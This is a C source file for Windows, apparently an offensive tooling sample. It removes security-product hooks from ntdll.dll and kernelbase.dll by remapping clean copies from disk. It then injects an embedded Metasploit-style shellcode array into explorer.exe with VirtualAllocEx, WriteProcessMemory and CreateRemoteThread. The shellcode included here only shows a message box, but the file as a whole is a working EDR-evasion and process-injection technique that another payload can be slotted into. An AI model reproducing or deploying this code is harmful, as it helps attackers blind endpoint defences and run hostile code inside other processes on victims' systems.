#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

unsigned char payload[] = 
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51"
"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48"
"\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48"
"\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e"
"\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88"
"\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48"
"\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e"
"\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41"
"\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24"
"\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e"
"\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41"
"\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
"\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1"
"\x00\x00\x00\x00\x3e\x48\x8d\x95\xfe\x00\x00\x00\x3e\x4c\x8d"
"\x85\x0f\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff"
"\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5\x48\x65\x6c"
"\x6c\x6f\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d"
"\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x00";
unsigned int payload_len = sizeof(payload);

unsigned char sNtdll[] = "ntdll.dll";
unsigned char sKernelbase[] = "kernelbase.dll";


int FindTarget(const char *procname) {

        HANDLE procSnapshot;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        procSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == procSnapshot) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(procSnapshot, &pe32)) {
                CloseHandle(procSnapshot);
                return 0;
        }
                
        while (Process32Next(procSnapshot, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(procSnapshot);
                
        return pid;
}


int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID addr = NULL;
	HANDLE hThread = NULL;

	addr = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, addr, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) addr, NULL, 0, NULL);
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


static int UnhookDll(const HMODULE targetDll, const LPVOID fileMapping) {
	DWORD oldprotect = 0;
	PIMAGE_DOS_HEADER pImgDOSHead = (PIMAGE_DOS_HEADER) fileMapping;
	PIMAGE_NT_HEADERS pImgNTHead = (PIMAGE_NT_HEADERS)((DWORD_PTR) fileMapping + pImgDOSHead->e_lfanew);
	int i;

	for (i = 0; i < pImgNTHead->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER pImgSectionHead = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pImgNTHead) + 
												((DWORD_PTR) IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char *) pImgSectionHead->Name, ".text")) {
			// prepare ntdll.dll memory region for write permissions.
			VirtualProtect((LPVOID)((DWORD_PTR) targetDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							PAGE_EXECUTE_READWRITE,
							&oldprotect);
			if (!oldprotect) {
					// RWX failed!
					return -1;
			}
			// copy fresh .text section into ntdll memory
			memcpy( (LPVOID)((DWORD_PTR) targetDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					(LPVOID)((DWORD_PTR) fileMapping + (DWORD_PTR) pImgSectionHead->VirtualAddress),
					pImgSectionHead->Misc.VirtualSize);

			// restore original protection settings of ntdll memory
			VirtualProtect((LPVOID)((DWORD_PTR)targetDll + (DWORD_PTR) pImgSectionHead->VirtualAddress),
							pImgSectionHead->Misc.VirtualSize,
							oldprotect,
							&oldprotect);
			if (!oldprotect) {
					return -1;
			}
			return 0;
		}
	}

	return -1;
}

int CreateMapping(unsigned char path[], unsigned char hooked_dll[])
{
	int ret = 0;
	HANDLE file;
	HANDLE targetDll;
	LPVOID fileMapping;

	file = CreateFile((LPCSTR) path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	
	if ( file == INVALID_HANDLE_VALUE ) {
			// failed to open ntdll.dll
			return -1;
	}

	targetDll = CreateFileMappingA(file, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	if (! targetDll) {
			// file mapping failed
			CloseHandle(file);
			return -1;
	}
	
	fileMapping = MapViewOfFile(targetDll, FILE_MAP_READ, 0, 0, 0);
	if (!fileMapping) {
					// mapping failed
					CloseHandle(targetDll);
					CloseHandle(file);
					return -1;
	}
	
	ret = UnhookDll(GetModuleHandle((LPCSTR) hooked_dll), fileMapping);

	UnmapViewOfFile(fileMapping);
	CloseHandle(targetDll);
	CloseHandle(file);
	
}

int main(void) {
    
	int pid = 0;
    HANDLE hProc = NULL;


	unsigned char sNtdllPath[] = "c:\\windows\\system32\\ntdll.dll";
	unsigned char sKernelbasePath[] = "c:\\windows\\system32\\kernelbase.dll";
	
	CreateMapping(sKernelbasePath,sKernelbase);
    printf("%s", "Unhooking KernelBase.dll\n"); getchar();

	CreateMapping(sNtdllPath,sNtdll);
	printf("%s", "Unhooking ntdll.dll\n"); getchar();
    
	pid = FindTarget("explorer.exe");

	if (pid) {
		
		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			Inject(hProc, payload, payload_len);
			CloseHandle(hProc);
		}
	}
	return 0;
}